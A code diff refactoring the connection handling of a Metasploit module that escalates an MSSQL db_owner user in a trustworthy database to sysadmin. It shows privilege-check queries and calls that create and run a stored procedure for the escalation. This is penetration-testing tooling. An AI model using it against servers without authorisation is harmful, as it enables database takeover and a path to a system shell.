@@ -15,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'Microsoft SQL Server - Escalate Db_Owner',
       'Description'    => %q{
         This module can be used to escalate privileges to sysadmin if the user has
-        the db_owner role in a "trustworthy" database owned by a sysadmin user.  Once
+        the db_owner role in a trustworthy database owned by a sysadmin user.  Once
         the user has the sysadmin role the msssql_payload module can be used to obtain
         a shell on the system.
       },
@@ -28,12 +28,12 @@ class Metasploit3 < Msf::Auxiliary
   def run
     # Check connection and issue initial query
     print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['username']}...")
-    if mssql_login_datastore == false
+    if mssql_login_datastore
+      print_good('Connected.')
+    else
       print_error('Login was unsuccessful. Check your credentials.')
       disconnect
       return
-    else
-      print_good('Connected.')
     end
 
     # Query for sysadmin status
@@ -83,6 +83,9 @@ class Metasploit3 < Msf::Auxiliary
         end
       end
     end
+
+    disconnect
+    return
   end
 
   # ----------------------------------------------
@@ -93,8 +96,7 @@ class Metasploit3 < Msf::Auxiliary
     sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"
 
     # Run query
-    result = mssql_query(sql, false) if mssql_login_datastore
-    disconnect
+    result = mssql_query(sql, false)
 
     # Parse query results
     parse_results = result[:rows]
@@ -119,8 +121,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      result = mssql_query(sql, false) if mssql_login_datastore
-      disconnect
+      result = mssql_query(sql, false)
     rescue
       # Return on fail
       return 0
@@ -137,12 +138,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # ----------------------------------------------
-  # Method to check if user has the db_owner role 
+  # Method to check if user has the db_owner role
   # ----------------------------------------------
   def check_db_owner(trustdb_list)
     # Check if the user has the db_owner role is any databases
     trustdb_list.each { |db|
-      
       # Setup query
       sql = "use #{db[0]};select db_name() as db,rp.name as database_role, mp.name as database_user
       from [#{db[0]}].sys.database_role_members drm
@@ -151,8 +151,7 @@ class Metasploit3 < Msf::Auxiliary
       where rp.name = 'db_owner' and mp.name = SYSTEM_USER"
 
       # Run query
-      result = mssql_query(sql, false) if mssql_login_datastore
-      disconnect
+      result = mssql_query(sql, false)
 
       begin
         # Parse query results
@@ -189,8 +188,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_create, false) if mssql_login_datastore
-      disconnect
+      mssql_query(evilsql_create, false)
     rescue
       # Return error
       error = 'Failed to create stored procedure.'
@@ -206,8 +204,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_run, false) if mssql_login_datastore
-      disconnect
+      mssql_query(evilsql_run, false)
     rescue
       # Return error
       error = 'Failed to run stored procedure.'
@@ -223,8 +220,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_remove, false) if mssql_login_datastore
-      disconnect
+      mssql_query(evilsql_remove, false)
 
       # Return value
       return 1
